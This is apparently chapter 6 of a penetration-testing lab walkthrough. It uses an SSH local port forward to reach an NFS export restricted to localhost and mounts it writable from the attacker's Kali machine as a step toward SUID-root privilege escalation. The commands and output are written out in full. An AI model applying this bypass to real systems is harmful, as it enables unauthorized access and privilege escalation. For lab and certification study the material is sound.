# 06 — Through the tunnel

The export only answers `localhost`. The way to become `localhost` is not to spoof an address but to
let the target make the connection to itself — with an SSH forward carrying it.

## 6.1 The idea

An SSH local forward opens a listening port on the client and, for every connection it receives,
opens a matching connection **from the SSH server**. The server-side connection originates on the
server, so its source address is `127.0.0.1` as far as the NFS daemon is concerned.

```text
kali 127.0.0.1:2049  ──ssh──►  oscp 127.0.0.1:2049
      (mount runs here)         (rpc.nfsd sees a local client)
```

Two details make it work:

| Detail | Why it matters |
|---|---|
| `localhost` in `-L` is resolved **on the server** | the forward terminates on the target's loopback, not on Kali's |
| the tunnel's server-side socket uses an ephemeral port | the export needs `insecure`, added in the previous chapter |

## 6.2 Open the forward

```bash
kali@kali:~/exam$ ssh -L 2049:localhost:2049 matt@172.16.97.110
```

```text
matt@172.16.97.110's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-84-generic x86_64)
...
matt@oscp:~$
```

Leave this session open. It is the transport for the mount, not just a shell.

`-L 2049:localhost:2049` reads as *local port : destination host : destination port*. The destination
host is evaluated by `sshd` on the target, which is why the export sees a loopback client.

Binding port `2049` locally is below 1024; Kali allows unprivileged low-port binds
(`net.ipv4.ip_unprivileged_port_start=0`), so the forward does not need `sudo`. On a host that keeps
the default limit of 1024, use the high-port variant in §6.5.

## 6.3 Mount through loopback

In a second terminal on Kali:

```bash
kali@kali:~/exam$ sudo mkdir -p /mnt/nfs
kali@kali:~/exam$ sudo mount -t nfs 127.0.0.1:/usr/upload /mnt/nfs
kali@kali:~/exam$ mount | grep /mnt/nfs
```

```text
127.0.0.1:/usr/upload on /mnt/nfs type nfs4 (rw,relatime,vers=4.2,rsize=1048576,wsize=1048576,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=127.0.0.1,local_lock=none,addr=127.0.0.1)
```

No `access denied`. The path in the mount table says `127.0.0.1:/usr/upload`, but every byte of that
traffic is travelling to `172.16.97.110` inside the SSH session and arriving on its loopback
interface.

`type nfs4` is what makes a single forwarded port sufficient. NFSv4 carries the mount protocol inside
the same connection on `2049`; it has no separate `rpcbind` or `mountd` lookup. An NFSv3 mount would
first ask the portmapper on `111` where `mountd` lives, and neither port is forwarded here — the mount
would fail even with `insecure` set. If a server only offers v3, forward `111` and `20048` as well and
mount with `-o vers=3`.

```bash
kali@kali:~/exam$ ls -la /mnt/nfs
```

```text
total 8
drwxr-xr-x 2 root root 4096 Jul 21 20:11 .
drwxr-xr-x 1 root root 4096 Jul 21 20:12 ..
```

The directory is empty and owned by `root` — the same directory the target sees as `/usr/upload`.

## 6.4 Why the two failures are gone

| Previous failure | What changed |
|---|---|
| `access denied by server` | the request now originates from the target's `127.0.0.1`, matching `localhost` |
| high source port rejected | `insecure` was added to the export line |

Both conditions are required. A tunnel without `insecure` still fails the port check; `insecure`
without a tunnel still fails the address check.

## 6.5 If port 2049 is already taken locally

Binding `2049` on Kali fails if another NFS client or a previous tunnel still holds it. Any local port
works as long as the mount is told which one to use:

```bash
kali@kali:~/exam$ ssh -L 3049:localhost:2049 matt@172.16.97.110
kali@kali:~/exam$ sudo mount -t nfs -o port=3049 127.0.0.1:/usr/upload /mnt/nfs
```

`-o port=3049` changes the destination port the client dials; the SSH forward rewrites it to `2049` on
the target.

## 6.6 Keep the session, and unmount first

The mount is `hard` by default: if the SSH session dies, every process touching `/mnt/nfs` blocks in
uninterruptible I/O until the mount is removed. In order:

```bash
kali@kali:~/exam$ sudo umount /mnt/nfs
kali@kali:~/exam$ exit          # close the SSH session last
```

For lab work a `soft` mount with a short timeout avoids a wedged terminal, at the cost of I/O errors
instead of retries:

```bash
kali@kali:~/exam$ sudo mount -t nfs -o soft,timeo=50,retrans=1 127.0.0.1:/usr/upload /mnt/nfs
```

The export is now writable from a machine where we are root. That is the last precondition.

---

**Next:** [`07-suid-root.md`](07-suid-root.md)
